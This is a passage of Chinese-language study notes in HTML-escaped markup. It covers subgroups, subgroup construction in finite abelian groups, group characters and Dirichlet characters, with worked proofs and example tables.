&lt;ol&gt;
&lt;li&gt;设$(G,&lt;em&gt;)$是群，H是G的&lt;strong&gt;非空子集&lt;/strong&gt;，如果$(H,&lt;/em&gt;)$是一个群，那么$(H,&lt;em&gt;)$是$(G,&lt;/em&gt;)$的子群。&lt;/li&gt;
&lt;li&gt;平凡子群：$(G,&lt;em&gt;),({e},&lt;/em&gt;)$&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Th1:&lt;/strong&gt;（群的单位元也是其子群的单位元）H是群G的子群，$e\in G$是单位元，则$e$也是子群H的单位元。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;假设H的单位元是$e&amp;rsquo;且e&amp;rsquo;\ne e$，对于$a\in H$来说，有&lt;/p&gt;
&lt;p&gt;$e&amp;rsquo;&lt;em&gt;a=a=e&lt;/em&gt;a$&lt;/p&gt;
&lt;p&gt;根据消去律，我们的得到$e&amp;rsquo;=e$，矛盾。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Th2：&lt;/strong&gt;（元素在子群中，其逆元也必然在子群中）$H$是群$G$的子群，$a\in H$那么$a^{-1} \in H$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设$b\in H,b \ne a^{-1},a*b=e$&lt;/p&gt;
&lt;p&gt;那么有$a&lt;em&gt;a^{-1}=e=a&lt;/em&gt;b$&lt;/p&gt;
&lt;p&gt;根据消去律，我们得到$a^{-1}=b$，矛盾&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**Th3:**如何判断子群？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;$H$是群$G$的子群，$\forall a,b \in H$。都有$a*b^{-1}\in H$，那么$H$是$G$的子群。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对$\forall a \in H$,有$e=a*a^{-1}\in H$，所以G的单位元也是H的单位元&lt;/p&gt;
&lt;p&gt;对$\forall a \in H$,有$a^{-1}=e*a^{-1}\in H$，所以a的逆元也在H中&lt;/p&gt;
&lt;p&gt;对$\forall a,b \in H$,有$b^{-1}\in H$，所以$a&lt;em&gt;b=a&lt;/em&gt;(b^{-1})^{-1} \in H$,所以H是封闭的。&lt;/p&gt;
&lt;p&gt;G有结合律，他的子集一定也有结合律&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果$G&amp;rsquo;$是$G$的一个非空子集，那么$G&amp;rsquo;$是$G$的一个子群，当且仅当，$G&amp;rsquo;$满足封闭性和逆元存在性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;封闭性：$\forall a,b, \in G&amp;rsquo;,ab\in G&#39;$&lt;/li&gt;
&lt;li&gt;逆元存在性：$a,\in G&amp;rsquo;,a^{-1} \in G&#39;$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;如果$G&amp;rsquo;$是子群，那么子群肯定满足封闭性和逆元存在性。&lt;/p&gt;
&lt;p&gt;反过来，如果$G&amp;rsquo;$满足封闭性和逆元存在性，我们只需要证明满足结合性和单位元就能证明他是个子群。&lt;/p&gt;
&lt;p&gt;$G$是满足结合性的，那么$G&amp;rsquo;$中的元素肯定也满足结合性。&lt;/p&gt;
&lt;p&gt;因为$G&amp;rsquo;$非空，所以取其中一个元素$a$，已经知道$a^{-1} \in G&amp;rsquo;$，再根据封闭性：$aa^{-1}=e\in G&amp;rsquo;$得到单位元存在。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter2-构造子群&#34;&gt;Chapter2 构造子群
&lt;/h2&gt;&lt;h3 id=&#34;section1-针对阿贝尔群的两种构造方法&#34;&gt;Section1 针对阿贝尔群的两种构造方法
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**G是阿贝尔群，$m\in Z$，那么$G^{m}:={a^m | a\in G}$是G的子群
&lt;ul&gt;
&lt;li&gt;例如$G^{3}:={a^3 | a\in G},G^{-3}:={(a^{-1})^{3} | a\in G},G^{0}:={e | e\in G}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;$a,b \in G$,那么如果是子群的话，在子群里表示为$a^m,b^m\in G^m$。&lt;/p&gt;
&lt;p&gt;根据子群的判断方法，只需要证明$a^m*(b^m)^{-1} = a^m*(b^{-1})^m = (a*b^{-1})^m \in G^m$&lt;/p&gt;
&lt;p&gt;因为G是封闭的，所以$(a*b^{-1})$是G里的元素&lt;/p&gt;
&lt;p&gt;举个简单的例子：&lt;/p&gt;
&lt;p&gt;对于$(Z,+)$来说，$Z^m$其实就是$mZ:={mz | z \in Z}={0,\pm m,\pm2m,\cdots}$&lt;/p&gt;
&lt;p&gt;对于$(Z_n,+)$来说,他是个阿贝尔加法群，$Z^m$其实就是$mZ_n:={mz \bmod n | z \in Z_n}$&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;$Z_{15}$&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;0&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;7&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;8&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;9&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;10&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;11&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;12&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;13&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;14&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$2Z_{15}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;8&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;14&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;7&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;11&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;13&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$3Z_{15}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$4Z_{15}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;8&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;13&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;14&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;7&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;11&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$5Z_{15}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$6Z_{15}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;12&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;9&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**Th2：**G是阿贝尔群，$m\in Z$，则$G{m}:={a\in G|a^m=e}$是G的子群。(挑出来m次运算后等于单位元的数)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先$a,b \in G,a^m = b^m = e$,那么$a,b \in G{m}$。&lt;/p&gt;
&lt;p&gt;$(a&lt;em&gt;b^{-1})^m=a^m * (b^{-1})^m = a^m * (b^m)^{-1}=e&lt;/em&gt;e=e$&lt;/p&gt;
&lt;p&gt;所以$a*b^{-1} \in G$,$G{m}$是G的一个子集。&lt;/p&gt;
&lt;p&gt;举个简单的例子：&lt;/p&gt;
&lt;p&gt;对于$(Z_n,+)$来说,他是个阿贝尔加法群，$Z^m$其实就是$mZ_n:={mz \equiv0 \bmod n | z \in Z_n}$（0是单位元）&lt;/p&gt;
&lt;p&gt;把z看成未知数，$d=(m,n)$，$mz \equiv0 \pmod n \Rightarrow z \equiv 0 \pmod{\dfrac{n}{d}}$&lt;/p&gt;
&lt;p&gt;可见，$Z_n$中的元素只有在是$\dfrac{n}{d}$的倍数的时候，才是子集中的元素。&lt;/p&gt;
&lt;p&gt;根据同余方程的性质，子集中的元素一共有d个，分别是${0,\dfrac{n}{d},\dfrac{2n}{d},\cdots,\dfrac{(d-1)n}{d}}$&lt;/p&gt;
&lt;p&gt;根据第一种构造方法，上面的集合就等于$\dfrac{n}{d}Z_n$。&lt;/p&gt;
&lt;p&gt;而且，上面的集合中的元素乘d后就是n的倍数，模n为0，于是又可以写成$Z_n{d}$&lt;/p&gt;
&lt;p&gt;于是$Z_N{m}=Z_n{d}=\dfrac{n}{d}Z_n,d=(m,n)$这三个子集相同。&lt;/p&gt;
&lt;p&gt;对照上表印证结论$Z_{15}{6}=Z_{15}{3}=\dfrac{15}{3}Z_{15}={0,5,10},3=(6,15)$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section2-子群的结构&#34;&gt;Section2 子群的结构
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个群如果是有限集合，就称为是有限群，这时G的元素的个数叫做G的阶，记为$|G|$&lt;/li&gt;
&lt;li&gt;如果$G&amp;rsquo;$是有限群$G$的一个子群，那么对G的任意元素$a$，有一个整数$n$，使$a^n \in G&amp;rsquo;$,我们称这个n为a在G中的指数。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th1:令$G&amp;rsquo;$是有限阿贝尔群G的一个子群，并且$G&amp;rsquo;\ne G$,在G中挑选一个元素$a$，$a \notin G&amp;rsquo;$，并设$h$是$a$在$G&amp;rsquo;$中的指数。那么乘积的集合$G&amp;rsquo;&amp;rsquo;={xa^k | x\in G&amp;rsquo; 且k=0,1,2,\cdots,h-1}$这样一个集合是$G$的一个包含$G&amp;rsquo;$的子群，而且$G&amp;rsquo;&amp;rsquo;$的阶是$G&amp;rsquo;$的h倍，即$|G&amp;rsquo;&amp;rsquo;| = h|G&amp;rsquo;|$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先证明$G&amp;rsquo;&amp;rsquo;$是一个子群。我们通过证明$G&amp;rsquo;&amp;rsquo;$集合拥有封闭性和逆元存在性来证明他是$G$的一个子集。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;证明封闭性：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在$G&amp;rsquo;&amp;rsquo;$中任取两个元素$xa^k,ya^j;x,y\in G&amp;rsquo;,0\le k&amp;lt;h,0\le j&amp;lt;h$。&lt;/p&gt;
&lt;p&gt;既然$G$是阿贝尔群，所以元素都满足交换律，所以
$$
(xa^k)(ya^j)=(xy)a^{k+j}
$$
将$k+j$改写为带余除法的形式$k+j=qh+r,0\le r&amp;lt;h$，有
$$
a^{k+j}=a^{qh}a^r
$$
而$a^{qh}=(a^h)^q\in G&amp;rsquo;$,我们发现$a^{qh}a^r$满足$G&amp;rsquo;&amp;rsquo;$集合的定义，所以证明了$G&amp;rsquo;&amp;rsquo;$满足封闭性条件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;证明逆元存在：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在$G&amp;rsquo;&amp;rsquo;$中任取一个元素$xa^k$，如果$k=0$，那这个元素的逆元$x^{-1}\in G&amp;rsquo;$。&lt;/p&gt;
&lt;p&gt;如果$0&amp;lt;k&amp;lt;h$，这个元的逆元就变成了$ya^{h-k},y=x^{-1}(a^h)^{-1}$，这个形式也满足集合$G&amp;rsquo;&amp;rsquo;$的定义，所以证明了逆元也是$\in g&amp;rsquo;&amp;rsquo;$的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确定$G&amp;rsquo;&amp;rsquo;$的阶：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;令$m=|G&amp;rsquo;|$，因为$x\in G&amp;rsquo;$，所以$x$可以有m种取法。而$0\le k\le h-1$，k有h种取法。组合起来$xa^k$应该是有$mh$种形式的，也就是有mk个。只要我们能证明这mk个元素两两互不相同，便可以证明$G&amp;rsquo;&amp;rsquo;$的阶是mh。&lt;/p&gt;
&lt;p&gt;假设两个元素相等$xa^k=ya^j \quad (0\le j\le k &amp;lt; h)$，那么$a^{k-j}=x^{-1}y$。&lt;/p&gt;
&lt;p&gt;而$x^{-1}y\in G&amp;rsquo;$，所以$a^{k-j} \in G&amp;rsquo;$。所以只能取$e$，那么$k=j，x=y$，最后两个元素其实还是一个元素。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter3-有限阿贝尔群的特征&#34;&gt;Chapter3 有限阿贝尔群的特征
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;令$G$是任意一个群，定义在$G$上的一个复值函数（$Z\rightarrow C$，从整数到复数）$f$，如果这个函数是积性的且非0，即
$$
\forall a,b \in G,f(ab)=f(a)f(b) \newline
\exist c,f(c)\ne0
$$
那么$f$就称为$G$的一个特征。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th1:如果$f$是一个具有恒等元e的有限群G的一个特征，那么$f(e)=1$，并且每个函数值$f(a)$是一个单位根。特别的，如果$a^n=e,f(a)^n=1$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;$G$中选$c,f(c)\ne0$。因为$ce=c$，所以$f(c)f(e)=f(c)$，所以$f(e)=1$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;如果$a^n=e$，那么$f(a)^n=f(a^n)=f(e)=1$.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th2:阶为n的有限阿贝尔群有且仅有n个不同的特征。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;证明思路：&lt;/p&gt;
&lt;p&gt;通过上面的一个定理我们知道如何通过一个已知的子群$G&amp;rsquo;\ne G$去构造一个包含$G&amp;rsquo;$的新子群$G&amp;rsquo;&amp;rsquo;$，而且$G&amp;rsquo;&amp;rsquo;$中至少有一个元素不在$G&amp;rsquo;$中。
$$
我们将G&amp;rsquo;&amp;lsquo;表示为&amp;lt;G&amp;rsquo;;a&amp;gt;={xa^k:x\in G&amp;rsquo;,0\le k &amp;lt; h},h是a在G&amp;rsquo;中的指数
$$
现在我们将最小的子群${e}$拿出来作为$G_1$，如果$G_1 \ne G$，那么我们可以通过多次构造来得到一个有限集合和相对应子群的集合。
$$
G_{r+1}=&amp;lt;G_r;a_r&amp;gt; \newline
G_1\subset G_2\subset \cdots\subset G_{r+1}=G
$$
我们拥有这样一个子序列后，再通过归纳法即可证明。&lt;/p&gt;
&lt;p&gt;$G_1$显然有且仅有一个特征$f(e)=1$。假设对$G_r$的阶是$m$并且由且仅有$m$个特征。&lt;/p&gt;
&lt;p&gt;考虑$G_{r+1}=&amp;lt;G_r,a_r&amp;gt;$并设h是$a_r$在$G_r$中的指数（h是让$a_r^h\in G$的最小正整数）。&lt;/p&gt;
&lt;p&gt;如果能证明有且仅有$h$种不同的方法把$G_r$的每个特征$f$扩大到$G_{r+1}$的一个特征，并且$G_{r+1}$的每一个特征一定是$G_r$的某个特征的扩大，那么就说明$G_{r+1}$有$mh$个特征，并且$G_{r+1}$的阶是mh，所以归纳法证明成立。&lt;/p&gt;
&lt;p&gt;先假设能把$G_r$的一个特征扩大为$G_{r+1}$的一个特征$F$。根据积性得到：
$$
F(xa_r^k)=F(x)F(a_r)^k
$$
$x\in G$，所以$F(x)=f(x)$。于是我们有
$$
F(xa_r^k)=f(x)F(a_r)^k
$$
所以只要确定$F(a)^k$，就能确定$F(xa^k)$&lt;/p&gt;
&lt;p&gt;令$c=a_r^h$，因为$c\in G_r$，所以$F(c)=f(c)$并且由于$F$是积性的，$F(c)=F(a)^h$&lt;/p&gt;
&lt;p&gt;所以$F(a_r)^h=f(c)$，我们可以确定$F(a_r)$是$f(c)$的一个$h$次根。所以$F(a_r)$有h种选择。&lt;/p&gt;
&lt;p&gt;总结一下，如果$f$是$G_r$的一个已经确定的特征，我们选择$f(c),(c=a_r^h)$的h词根中的一个，确定$F(a_r)$就是这个数，所以我们用$F(xa_r^k)=f(x)F(a_r)^k$来确定$G_{r+1}$中不属于$G_r$那部分元素的特征$F$。=所以我们有$h$种方式去确定$F(xa_r^k)$&lt;/p&gt;
&lt;p&gt;4&lt;/p&gt;
&lt;p&gt;现在我们需要验证这个$F$是否满足可积，不然他不能成为一个特征。&lt;/p&gt;
&lt;p&gt;选择两个元素，我们有
$$
F(xa_r^k \cdot ya_r^j)=F(xya_r^{k+j})=f(xy)F(a_r)^{k+j}=f(x)f(y)F(a_r)^kF(a_r)^j=F(xa_r^k)F(ya_r^j)
$$
所以F确实是G的一个特征。&lt;/p&gt;
&lt;p&gt;不可能有两个被扩大的F,G相等，因为如果这样的话，扩大他们的f和g就会相等。&lt;/p&gt;
&lt;p&gt;所以$G_r$的m个特征里的每一个都能被h种方式扩大到$G_{r+1}$的特征。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter4-狄利克雷特征&#34;&gt;Chapter4 狄利克雷特征
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;现在我们专门研究模为一个固定的正整数k的简化剩余类群。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;令$G$是模k的简化剩余类群，对应于$G$上的每一个特征$f$，我们定义如下一个数论函数$\chi=\chi_f$
$$
\chi(n)=f(\hat n) \quad if(n,k)=1 \newline
\chi(n)=0 \quad\quad if(n,k)&amp;gt;1
$$
称$\chi$是模k的狄利克雷特征，主特征$\chi_1$有如下特征：
$$
\chi_1(n)=
\begin{cases}
1,&amp;amp;if(n,k)=1 \newline
0,&amp;amp;if(n,k)&amp;gt;1
\end{cases}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th1:模k的全体简化剩余类的集合是一个阶为$\varphi(k)$的有限阿贝尔群，恒等元是剩余类$\hat{1}$，$\hat a$的逆元是$\hat b$，满足$ab \equiv 1 \pmod k$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;剩余类有$\varphi(k)$个，所以阶是$\varphi(k)$。&lt;/p&gt;
&lt;p&gt;剩余类的封闭性是满足的，而且是有限剩余类，是阿贝尔群。&lt;/p&gt;
&lt;p&gt;类$\hat1$是恒等元，$\hat a$的逆元是$\hat b$，因为如果$(a,k)=1$存在唯一的$b,ab\equiv 1 \pmod k$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th2:有$\varphi(k)$个不同的狄利克雷特征模k，并且都是完全积性的、周期性的，即
$$
\chi(mn)=\chi(m)\chi(n) \newline
\chi(n+k)=\chi(n)
$$
反之，如果$\chi$是完全积性的并且以k为周期循环，并且当$(n,k)&amp;gt;1$有$\chi(n)=0$，则$\chi$一定是个模k的狄利克雷特征。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;模k的简化剩余系阶是$\varphi(k)$，所以有$\varphi(k)$个特征$f$。于是模k有$\varphi(k)$个$\chi_f$。&lt;/p&gt;
&lt;p&gt;证明完全积性：如果$m,n$都和$k$互素，那么根据群特征$f$可以得到$\chi(mn)=\chi(m)\chi(n)$;&lt;/p&gt;
&lt;p&gt;如果$m,n$中有一个与k不互素，那么$mn$与k也不会互素，于是$0=\chi(mn)=\chi(m)\chi(n)=0$&lt;/p&gt;
&lt;p&gt;证明周期性：由定义知道$\chi(n)=f(\hat n)$，而在简化剩余系中$f(\hat n+k)=f(\hat n)$&lt;/p&gt;
&lt;p&gt;反过来，如果$\chi$满足$\chi(n)=f(\hat n) \quad if(n,k)=1$这个条件，那么就符合狄利克雷特征的定义。&lt;/p&gt;
&lt;p&gt;根据阿贝尔群特征$f$的定义，我们让$f(\hat n)=\chi(n) \quad if(n,k)=1$，这就定义了群$G$上的函数$f$作为群的一个特征，自然满足$\chi$的需求，所以$\chi$是一个狄利克雷特征。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;k=3,$\varphi(k)=2$:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_1(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\chi_2(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
